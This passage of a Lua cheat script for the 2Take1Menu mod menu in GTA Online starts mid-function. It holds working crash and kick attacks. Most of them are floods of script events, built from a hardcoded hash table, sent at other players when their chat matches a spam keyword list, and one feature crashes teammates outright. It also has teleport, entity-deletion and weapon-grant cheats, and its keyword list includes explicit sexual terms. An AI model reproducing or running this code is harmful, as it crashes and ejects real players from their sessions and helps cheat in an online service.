                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Transaction error", pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Send to mission", pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Send to Perico island", pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Apartment invite", pid, {pid, generic_player_global(pid)})
                            end
                        end
                        return HANDLER_CONTINUE
                    end
                end
            end)
        else
            event.remove_event_listener("player_join",user_name_trial_id)
        end
    end
)
user_name_trial.hidden=true


_U_send_block_msg=menu.add_feature("发送屏蔽内容","toggle",adlanjie123.id,function()
end)
_U_send_block_msg.on = Settings["_U_send_block_msg"]

_U_Chat_trial=menu.add_feature("启用拦截屏蔽","toggle",adlanjie123.id,function(a)
        if a.on then
		Settings["guanggaojilanjie"] = true
            _U_Chat_trial_id=event.add_event_listener("chat",function(b)
                local pid=b.player
                local msg=b.body
                if player.is_player_valid(pid) and not player.is_player_friend(pid) and pid~=player.player_id() then
                    for i=1,#key_words do
                        if msg:match("%"..key_words[i]) then
                           menu.notify("清除广告机:"..player.get_player_name(pid),"", 3, RGBAToInt(0, 255, 227, 255))
                            if _U_send_block_msg.on then  
                                local fasong_msg='\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
                                network.send_chat_message(fasong_msg,false)
                            end
                            local file=io.open(utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\cfg\\scid.cfg","a+")
                            local msg=file:read('*a')
                            if not string.find(msg,string.format("%x",player.get_player_scid(pid))) then
                                file:write("\nad_bot:"..string.format("%x",player.get_player_scid(pid))..":c")
                            end
                            io.close(file)
                            if player.is_player_valid(pid) then
                                for x=1,4 do
                                    send_script_event("Crash "..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                network.network_session_kick_player(pid)
                                send_script_event("Netbail kick", pid, {pid, generic_player_global(pid)})
                            end
                            if player.is_player_valid(pid) then
                                for x=1,14 do
                                    send_script_event("Kick "..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Transaction error", pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Send to mission", pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Send to Perico island", pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Apartment invite", pid, {pid, generic_player_global(pid)})
                                end
                            end
                            return HANDLER_CONTINUE
                        end
                    end
                end
            end)
        else
            event.remove_event_listener("chat",_U_Chat_trial_id)
			Settings["guanggaojilanjie"] = false
        end		
    end
)
_U_Chat_trial.on = Settings["guanggaojilanjie"]
_U_Chat_trial.hidden=true

function get_session_lenth()
    local x=0
    for pid=0,31 do
        if player.is_player_valid(pid) then
            x=x+1
        end
    end
    return x
end

_U_Chat_trial2=menu.add_feature('智能检测','toggle',adlanjie123.id,function(a)
        while a.on do
		Settings["_U_Chat_trial2"] = true
            system.yield(0)
            if get_session_lenth()<=4 then
                if _U_Chat_trial.on then
                    _U_Chat_trial.on=false
                    user_name_trial.on=false
                end
            else
                if not _U_Chat_trial.on then
                    _U_Chat_trial.on=true
                    user_name_trial.on=true					
                end
            end
        end
		Settings["_U_Chat_trial2"] = false
    end
)
_U_Chat_trial2.on = Settings["_U_Chat_trial2"]

local globals = {}
local SE_send_limiter = {}
local essentials = {}
local kek_entity = {}

local script_event_hashes = {
    ["Netbail kick"] = 2092565704,
    ["Kick 1"] = 1964309656,
    ["Kick 2"] = 696123127,
    ["Kick 3"] = 43922647,
    ["Kick 4"] = 600486780,
    ["Kick 5"] = 1954846099,
    ["Kick 6"] = 153488394,
    ["Kick 7"] = 1249026189,
    ["Kick 8"] = 515799090,
    ["Kick 9"] = 1463355688,
    ["Kick 10"] = -1382676328,
    ["Kick 11"] = 1256866538,
    ["Kick 12"] = 515799090,
    ["Kick 13"] = -1813981910,
    ["Kick 14"] = 202252150,
    ["Kick 15"] = -19131151,
    ["Kick 16"] = -635501849,
    ["Kick 17"] = 1964309656,
	["Kick 17"] = 0x493FC6BB,
    ["Crash 1"] = -988842806,
    ["Crash 2"] = -2043109205,
    ["Crash 3"] = 1926582096,
    ["Crash 4"] = 153488394,
    ["Script host crash 1"] = 315658550,
    ["Script host crash 2"] = -877212109,
    ["Disown personal vehicle"] = -2072214082,
    ["Vehicle EMP"] = 975723848,
    ["Destroy personal vehicle"] = 1229338575,
    ["Kick out of vehicle"] = -1005623606,
    ["Remove wanted level"] = 1187364773,
    ["Give OTR or ghost organization"] = -397188359,
    ["Block passive"] = 1472357458,
    ["Send to mission"] = -1147284669,
    ["Send to Perico island"] = -1479371259,
    ["Apartment invite"] = 1249026189,
    ["CEO ban"] = 1355230914,
    ["Dismiss or terminate from CEO"] = -316948135,
    ["Insurance notification"] = 299217086,
    ["Transaction error"] = -2041535807,
    ["CEO money"] = 1152266822,
    ["Bounty"] = -1906146218,
    ["Banner"] = 1659915470,
    ["Sound 1"] = 1537221257,
    ["Sound 2"] = -1162153263,
    ["Bribe authorities"] = -151720011
}	
	
function globals.get_kick_hashes()
		local names = {}
		local hashes = {}
		for name, hash in pairs(script_event_hashes) do
			if name:find("^Kick %d+$") then
				names[#names + 1] = name
				hashes[#hashes + 1] = hash
			end
		end
		return names, hashes
	end
	
function globals.get_crash_hashes()
		local names = {}
		local hashes = {}
		for name, hash in pairs(script_event_hashes) do
			if name:find("^Crash %d+$") then
				names[#names + 1] = name
				hashes[#hashes + 1] = hash
			end
		end
		return names, hashes
	end	
	
function globals.get_script_event_hash(name)
		local hash = script_event_hashes[name]
		if math.type(hash) == "integer" then
			return hash
		else
			return 0
		end
	end
	
function globals.get_full_arg_table(pid)
		local args = {pid}
		for i = 2, 39 do
			args[i] = math.random(-2147483647, 2147483647)
		end
		return args
	end

function globals.send_script_event(name, pid, args, friend_condition)
		if player.is_player_valid(pid) and pid ~= player.player_id() then
			if math.type(pid) == "integer" then 
				for i = 1, #args do
					if math.type(args[i]) ~= "integer" then
						return
					end
				end
			else
				return
			end
			repeat
				local temp = {}
				for i = 1, #SE_send_limiter do
					if SE_send_limiter[i] > utils.time_ms() then
						temp[#temp + 1] = SE_send_limiter[i]
					end
				end
				SE_send_limiter = temp
				if #temp >= 10 then
					system.yield(0)
				end
			until #temp < 10
			if player.is_player_valid(pid) then
				SE_send_limiter[#SE_send_limiter + 1] = utils.time_ms() + (1 // gameplay.get_frame_time())
				script.trigger_script_event(globals.get_script_event_hash(name), pid, args)
			end
		else
			system.yield(0)
		end
	end

function globals.kick(pid)
		system.yield(0)
		if player.is_player_valid(pid) and pid ~= player.player_id() then
			if network.network_is_host() then
				network.network_session_kick_player(pid)
				return
			end
			local args = globals.get_full_arg_table(pid)
			args[2] = math.random(-2147483647, -1)
			args[24] = globals.generic_player_global(pid)
			globals.send_script_event("Kick 1", pid, args)
			globals.send_script_event("Kick 2", pid, {pid, math.random(-2147483647, 2147483647), pid})
			globals.send_script_event("Kick 3", pid, {pid, math.random(-2147483647, 2147483647)})
			globals.send_script_event("Kick 4", pid, {pid, -1, -1, -1, -1})
			local parameters = {
				pid
			}
			for i = 2, 23 do
				parameters[i] = math.random(-2147483647, -10)
			end
			globals.send_script_event("Kick 5", pid, parameters)
			for i, k in pairs({-1726396442, 154008137, 428882541, -1714354434}) do
				globals.send_script_event("Kick 6", pid, {
					pid, 
					k, 
					i, 
					1,
					math.random(-2147483647, -10),
					math.random(-2147483647, -10),
					math.random(-2147483647, -10),
					math.random(-2147483647, -10),
					math.random(-2147483647, -10),
					pid,
					math.random(-2147483647, -10),
					math.random(-2147483647, -10),
					math.random(-2147483647, -10)
				})
			end
			for i, script_name in pairs(globals.get_kick_hashes()) do
				globals.send_script_event(script_name, pid, globals.get_full_arg_table(pid))
			end
		end
	end
	
	function globals.script_event_crash(pid)
		system.yield(0)
		if player.is_player_valid(pid) then
			for i = 1, 19 do
				local parameters = {
					pid, 
					1258808115, 
					math.random(0, 4), 
					math.random(0, 1)
				}
				for i = 5, 13 do
					parameters[i] = math.random(1246667869,1757755807)
				end
				parameters[10] = pid
				globals.send_script_event("Crash 4", pid, parameters)
			end
			if script.get_host_of_this_script() == pid then
				for i = 0, 14 do
					globals.send_script_event("Script host crash 1", pid, {pid, i})
				end
				local parameters = {
					pid
				}
				for i = 2, 26 do
					parameters[i] = math.random(-10000, 10000)
				end
				globals.send_script_event("Script host crash 2", pid, parameters)
			end
			for i, script_name in pairs(globals.get_crash_hashes()) do
				local parameters = {
					pid
				}
				for i = 2, 10 do
					parameters[i] = math.random(-1212832151, 1212832151)
				end
				globals.send_script_event(script_name, pid, parameters)
			end
		end
	end	
	
function globals.generic_player_global(pid)
	return script.get_global_i(1893548 + (1 + (pid * 600) + 511))			
end

GUANGGAOJILANJIE1 = menu.add_feature("启用踢出", "toggle", adlanjie123.id, function(f)
	if f.on then
		Settings["guanggaojilanjie1"] = true
		chatlistener = event.add_event_listener("chat", function(m)
			if string.match(m.body,"买挂找我")
			or string.match(m.body,"裙")
			or string.match(m.body,"国产外挂")
			or string.match(m.body,"最强菜单")
			or string.match(m.body,"包更新")
			or string.match(m.body,"秒人")
			or string.match(m.body,"瞬移")
			or string.match(m.body,"辅助")
			or string.match(m.body,"萌新一起玩")
			or string.match(m.body,"块一亿")
			or string.match(m.body,"菜单官网")
			or string.match(m.body,"纯手工刷金")
			or string.match(m.body,"全网独家稳定不封")
			or string.match(m.body,"元一亿")
			or string.match(m.body,"有妹子")
			or string.match(m.body,"刷金")
			or string.match(m.body,"刷钱")
			or string.match(m.body,"www.")
			or string.match(m.body,"大片")
			or string.match(m.body,"激情大片")
			or string.match(m.body,"国外专业团队")
			or string.match(m.body,"线上开黑群")
			or string.match(m.body,"加威信GTA")
			or string.match(m.body,"吊打淘宝")
			or string.match(m.body,"随意奔放使用")
			or string.match(m.body,"您还在为钱而烦恼吗")
			or string.match(m.body,"出售辅助")
			or string.match(m.body,"强力科技")
			or string.match(m.body,"完全免费群")
			or string.match(m.body,"另售外挂")
			or string.match(m.body,"另有优惠辅助卖")
			or string.match(m.body,"持续查看")
			or string.match(m.body,"各种解锁")
			or string.match(m.body,"解锁等级")
			or string.match(m.body,"加入我们修仙联盟成功逆袭改")
			or string.match(m.body,"按T查看")
			or string.match(m.body,"辅助官网")
			or string.match(m.body,"联系管理员领")
			or string.match(m.body,"下单额外")
			or string.match(m.body,"荒野大镖客2代练")
			or string.match(m.body,"低价辅助")
			or string.match(m.body,"你把我关笼子里干嘛")
			or string.match(m.body,"科技官网")
			or string.match(m.body,"按t查看")
			or string.match(m.body,"活动期间")
			or string.match(m.body,"免费科技的加群")
			or string.match(m.body,"线上任务科技开黑群")
			or string.match(m.body,"老店")
			or string.match(m.body,"国产之光")
			or string.match(m.body,"最强外挂")
			or string.match(m.body,"淘宝")
			or string.match(m.body,"十年老店")
			or string.match(m.body,".club")
			or string.match(m.body,"刷金币")
			or string.match(m.body,"轰炸战局")
			or string.match(m.body,"shua")
			or string.match(m.body,"全往最低")
			or string.match(m.body,"扣扣")
			or string.match(m.body,"威信")
			or string.match(m.body,"购买金币")
			or string.match(m.body,"网站购买")
			or string.match(m.body,"代刷")
			or string.match(m.body,".COM")
			or string.match(m.body,".xyz")
			or string.match(m.body,"免费辅助")
			or string.match(m.body,"GTA5SHUA")
			or string.match(m.body,".com")
			or string.match(m.body,"亿")
			or string.match(m.body,".cn")
			or string.match(m.body,".pro")
			or string.match(m.body,"亚洲")
			or string.match(m.body,"信用保障")
			or string.match(m.body,"主播")
			or string.match(m.body,"颜射")
			or string.match(m.body,"支持花呗")
			or string.match(m.body,"；")
			or string.match(m.body,":")
			or string.match(m.body,".LOVE")
			or string.match(m.body,"抠逼自慰")
			or string.match(m.body,"在线观看")
			or string.match(m.body,"你也是这个网站买的吗？")
			or string.match(m.body,"封号包赔")
			or string.match(m.body,"加微信就送2000w")
			or string.match(m.body,"乱伦")
			or string.match(m.body,"刷钱低价")
			or string.match(m.body,"大表哥科技")
			or string.match(m.body,"刚更新完游戏好卡")
			or string.match(m.body,"淘宝店铺")
			or string.match(m.body,"安全稳定")
			or string.match(m.body,"解锁")
			or string.match(m.body,"全网最低")
			or string.match(m.body,"GTA5免费辅助")
			or string.match(m.body,"澳门赌场")
			or string.match(m.body,"地堡刷金")
			or string.match(m.body,"老牌辅助")
			or string.match(m.body,"淘宝平台下单")
			or string.match(m.body,"扣扣")
			or string.match(m.body,"千人售后")
			or string.match(m.body,"shua")
			or string.match(m.body,"有妹子一起玩")
			or string.match(m.body,"威信")
			or string.match(m.body,"卖淫")
			or string.match(m.body,"购买找我")
			or string.match(m.body,"日本女优")
			or string.match(m.body,"科技群")
			or string.match(m.body,"购买地址")
			or string.match(m.body,"网址进入")
			or string.match(m.body,"麻豆传媒")
			or string.match(m.body,"你把我关笼子里干嘛")
			or string.match(m.body,"唰金")
			or string.match(m.body,"金条")
			or string.match(m.body,"丝袜")
			or string.match(m.body,"大片")
			or string.match(m.body,"在线观看")
			or string.match(m.body,"解锁大师")
			or string.match(m.body,"刷金条")
			or string.match(m.body,"处女")
			or string.match(m.body,"女优")
			or string.match(m.body,"解所")
			or string.match(m.body,"淘宝")
			or string.match(m.body,"代练")
			or string.match(m.body,"任务组队")
			or string.match(m.body,"金币")
			or string.match(m.body,"微信GTA")
			or string.match(m.body,"加群联系群主")
			or string.match(m.body,"日本大片")
			or string.match(m.body,".中国")
			or string.match(m.body,".我爱你")
			or string.match(m.body,".CN")
			or string.match(m.body,".vip")
			or string.match(m.body,".online")
			or string.match(m.body,".VIP")
			or string.match(m.body,"卡网地址")
			or string.match(m.body,"购买官网")
			or string.match(m.body,"辅助官网")
			or string.match(m.body,"无敌 传送")
			or string.match(m.body,"GTA5线上刷钱")
			or string.match(m.body,"特价辅助")
			or string.match(m.body,"自瞄-无敌-套模-瞬移")
			or string.match(m.body,"平台交易")
			or string.match(m.body,"下单即送")
			or string.match(m.body,"偷拍自拍")
			or string.match(m.body,"微信同号")
			or string.match(m.body,"手工代练")
			or string.match(m.body,"&套模&笼子")
			or string.match(m.body,"安全吻定")
			or string.match(m.body,"天基炮无冷却")
			or string.match(m.body,"激情大片在观")
			or string.match(m.body,"推出特惠S套")
			or string.match(m.body,"支持淘宝&支付")
			or string.match(m.body,"先刷后付")
			or string.match(m.body,"来自品如的广告")
			or string.match(m.body,"固定查看")
			or string.match(m.body,"淘宝四钻商铺")
			or string.match(m.body,"人大群")
			or string.match(m.body,"赠送外挂")
			or string.match(m.body,"战局追踪")
			or string.match(m.body,"出售高级外挂")
			or string.match(m.body,".top")
			or string.match(m.body,"QQ.+解锁")
			then
			if m.player ~= player.player_id() then
			globals.script_event_crash(m.player)
            system.wait(5)
            script.trigger_script_event(0xAD63290E, m.player, {m.player, globals.generic_player_global(m.player)})
			system.wait(5)
            script.trigger_script_event(0xAD63290E, m.player, {m.player, globals.generic_player_global(m.player)})
            globals.kick(m.player)
			end
			return HANDLER_CONTINUE
			end
		end)
		else
		event.remove_event_listener("chat", chatlistener)
		chatlistener  = nil
		Settings["guanggaojilanjie1"] = false
	end
end)
GUANGGAOJILANJIE1.on = Settings["guanggaojilanjie1"]

local friends = {}
for fid = 0, 249 do
local features = {}
friends[fid] = menu.add_feature("Player " .. fid, "action", a.friendlists.id, function()
local name = network.get_friend_index_name(fid)
local bedrid = network.get_friend_scid(name)
cilprid = utils.to_clipboard(bedrid)
copy_rid = bedrid
notify_above_map("玩家："..name.." RID: "..bedrid.." 已经复制")
end)

friendlist[fid] = {
    feat = friends[fid],
	   features = features
     }
    friends.hidden = true
end

function teleport(x, y, z, heading)
    local pos = v3()
    pos.x = x
    pos.y = y
    pos.z = z
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
    entity.set_entity_heading(player.get_player_ped(player.player_id()), heading)
end

local function flash()
	pos = player.get_player_coords(player.player_id())
	rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
	dir = rot
	dir:transformRotToDir()
	dir = dir * 5
	pos = pos + dir
	pos.z = pos.z + 0;
	if ped.is_ped_in_any_vehicle(player.get_player_ped(player.player_id())) then
		car = ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id()))
		network.request_control_of_entity(car)
		entity.set_entity_coords_no_offset(car, pos)
	else
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
	end
end

local function behind()
	pos = player.get_player_coords(player.player_id())
	rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
	dir = rot
	dir:transformRotToDir()
	dir = dir * 5
	pos = pos - dir
	pos.z = pos.z + 0;
	if ped.is_ped_in_any_vehicle(player.get_player_ped(player.player_id())) then
		car = ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id()))
		network.request_control_of_entity(car)
		entity.set_entity_coords_no_offset(car, pos)
	else
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
	end
end

function tpVehicle()
    local vehicle = player.get_personal_vehicle()
    local timer = utils.time_ms()
    while(not network.request_control_of_entity(vehicle) and utils.time_ms() < timer +5000) do
   system.wait(0)
    end
   entity.set_entity_coords_no_offset(vehicle, player.get_player_coords(player.player_id()))
end

menu.add_feature("召回个人载具", "action", a.teleport.id, function(playerfeat)
   tpVehicle()
end)

auto_delivery= menu.add_feature("自动传送标记点","toggle",a.teleport.id,function(feat)
	while feat.on do
		Settings["auto_delivery"] = true
		local waypointpos = ui.get_waypoint_coord()
		if waypointpos.x ~= 16000 then
			local mypos = player.get_player_coords(player.player_id())
			local esliposz = 850
			if waypointpos:magnitude(v2(mypos.x,mypos.y)) > 35 then
				local boolpara, posz = gameplay.get_ground_z(v3(waypointpos.x, waypointpos.y, esliposz))
				while not boolpara do
					esliposz  = esliposz - 5
					boolpara, posz = gameplay.get_ground_z(v3(waypointpos.x, waypointpos.y, esliposz))
					if esliposz  < -200 then
						esliposz  = -200
						boolpara = true
					end
				end
				pedd = player.get_player_ped(player.player_id())
				if ped.is_ped_in_any_vehicle(pedd) then
					local car = ped.get_vehicle_ped_is_using(pedd)
					network.request_control_of_entity(car)
					entity.set_entity_coords_no_offset(car,v3(waypointpos.x, waypointpos.y, posz))
				else
					entity.set_entity_coords_no_offset(pedd,v3(waypointpos.x, waypointpos.y, posz))
				end
				
			end
		end
		return HANDLER_CONTINUE
	end
	feat.on = false
	Settings["auto_delivery"] = false
end)
auto_delivery.on = Settings["auto_delivery"]

clear_notice=menu.add_feature("清理通知", "toggle", rwugn.id, function(a)
while a.on do
Settings["clear_notice"] = true
ui.get_current_notification(ui.remove_notification(0))
if not a.on then return end
system.wait(1)
end
Settings["clear_notice"] = false
end)
clear_notice.on = Settings["clear_notice"]

savepos= c.df("保存当前位置","action",rwugn.id,function(k,pid)
mypos = player.get_player_coords(c.me())
teleporttopos.hidden = false
ui.notify_above_map("保存完毕", "", 200)
end)

teleporttopos= c.df("传送到保存位置","action",rwugn.id,function(k,pid)
pedmy = player.get_player_ped(c.me())
entity.set_entity_coords_no_offset(pedmy,mypos)
end)
teleporttopos.hidden = true

_U_reset_ceamre=menu.add_feature("修复侦查照片无法发送","action",rwugn.id,function()
stats.stat_set_int(gameplay.get_hash_key("MP1_H3OPT_ACCESSPOINTS"), 0,true)
stats.stat_set_int(gameplay.get_hash_key("MP1_H3OPT_POI"), 0,true)
stats.stat_set_int(gameplay.get_hash_key("MP0_H3OPT_ACCESSPOINTS"), 0,true)
stats.stat_set_int(gameplay.get_hash_key("MP0_H3OPT_POI"), 0,true)
menu.notify('修复完成,重新做拍照任务即可','',3)
end)

stopcutscene= c.df("跳过过场动画","action",rwugn.id,function(k,pid)
	cutscene.stop_cutscene_immediately()
	cutscene.remove_cutscene()
end)

offsetpickuptome= c.df("拾取附近所有物品", "action", rwugn.id, function(k)
	mypos = player.get_player_coords(c.me())
	allpickup = object.get_all_pickups()
	for i = 1, #allpickup do
		entity.set_entity_coords_no_offset(allpickup[i],mypos)
		c.wait(1)
	end
end)

crashteam= c.df("崩溃队友","action",rwugn.id,function(k,pid)
	for pid = 0, 4 do
		if pid ~= c.me() then
			SECrah(pid)
		end
	end
end)

vehcar123 = menu.add_feature("预设载具","parent", rwugn.id, function()
end)


GiveCar = menu.add_feature("骷髅马","action",vehcar123.id,function()
	pos = player.get_player_coords(player.player_id())
	rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
	dir = rot
	dir:transformRotToDir()
	dir = dir * 5
	pos = pos + dir
	spawn_vehicle(410882957,pos,0)
end)

GiveCar2 = menu.add_feature("义警","action",vehcar123.id,function()
pos = player.get_player_coords(player.player_id())
rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
dir = rot
dir:transformRotToDir()
dir = dir * 5
pos = pos + dir
spawn_vehicle(3052358707,pos,0)
end)

GiveCar3 = menu.add_feature("可汗贾利","action",vehcar123.id,function()
pos = player.get_player_coords(player.player_id())
rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
dir = rot
dir:transformRotToDir()
dir = dir * 8
pos = pos + dir
spawn_vehicle(2859440138,pos,0)
end)

GiveCar4 = menu.add_feature("秃鹫攻击直升机","action",vehcar123.id,function()
pos = player.get_player_coords(player.player_id())
rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
dir = rot
dir:transformRotToDir()
dir = dir * 8
pos = pos + dir
spawn_vehicle(788747387,pos,0)
end)

GiveCar5 = menu.add_feature("武装小艇","action",vehcar123.id,function()
pos = player.get_player_coords(player.player_id())
rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
dir = rot
dir:transformRotToDir()
dir = dir * 5
pos = pos + dir
spawn_vehicle(3314393930,pos,0)
end)
Flash = c.df("向前传送","action",rwugn.id,function()
	flash()
end)

Flash1 = c.df("向后传送","action",rwugn.id,function()
	behind()
end)

FollowMe = c.df("传送队友到我","action",rwugn.id,function()
local car
local pos = v3()
if player.player_id() == 0 then
pid = 1
else
pid = 0
end
pos = entity.get_entity_coords(player.get_player_ped(player.player_id()))
rot = entity.get_entity_rotation(player.get_player_ped(player.player_id()))
dir = rot
dir:transformRotToDir()
dir = dir * 3
pos = pos + dir
if ped.is_ped_in_any_vehicle(player.get_player_ped(pid)) then
car = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
network.request_control_of_entity(car)
entity.set_entity_coords_no_offset(car, pos)
ui.notify_above_map("如果传送失败多点几次", "友情提示", 69)
else
ui.notify_above_map("队友必须上车", "错误提示", 96)
end
end)

GiveAllGuns = c.df("全员获得全部武器","action",rwugn.id,function()
	for pid = 0, 4 do
		if pid ~= player.player_id() and player.is_player_valid(pid) then
			local allweaponhashes = weapon.get_all_weapon_hashes()
			for i = 1, #allweaponhashes do
				requestmodel(allweaponhashes[i])
				weapon.give_delayed_weapon_to_ped(player.get_player_ped(pid), allweaponhashes[i], 0, 0)
				weapon.set_ped_ammo(player.get_player_ped(pid),allweaponhashes[i],9999)
				streaming.set_model_as_no_longer_needed(allweaponhashes[i])
			end
		end
	end
end)

GiveGuns = c.df("全员获得火神机枪","action",rwugn.id,function()
	for pid = 0, 4 do
		pedp = player.get_player_ped(pid)
		minigun = 1119849093
		weapon.give_delayed_weapon_to_ped(pedp,minigun,0,1)
		weapon.set_ped_ammo(pedp,minigun,9999)
	end
end)

menu.add_feature("移除NPC","value_str",rwugn.id,function(feat)
	while feat.on do
		if feat.value == 0 then
			for i, pedd in pairs(ped.get_all_peds()) do
				if ped.is_ped_a_player(pedd) == false then
					ped.set_ped_health(pedd, 1)
				end
				system.wait(0)
			end
		end
		if feat.value == 1 then
			for i, pedd in pairs(ped.get_all_peds()) do
				if ped.is_ped_a_player(pedd) == false then
					entity.delete_entity(pedd)
				end
				system.wait(0)
			end
		end
		system.wait(0)
	end
end
):set_str_data {"心脏骤停", "清空删除"}

Removepedweapon = c.df("移除附近NPC武器","action",rwugn.id,function()
	allpeds = ped.get_all_peds()
	for i = 1, #allpeds  do
		if not ped.is_ped_a_player(allpeds[i]) then
			get_control_of_entity(allpeds[i],300)
			weapon.remove_all_ped_weapons(allpeds[i])
		end		
	end
end)

deleobject= c.df("移除附近物体", "action", rwugn.id, function(k)
	mypos  = player.get_player_coords(c.me())
	allobject = object.get_all_objects()
	for i = 1, #allobject  do
		entity.delete_entity(allobject[i])
		c.wait(1)
	end
end)
	
deleveh= c.df("移除附近载具", "action", rwugn.id, function(k)
	allvehs = vehicle.get_all_vehicles()
	for i = 1,#allvehs do
		entity.delete_entity(allvehs[i])
		c.wait(1)            
	end
end)
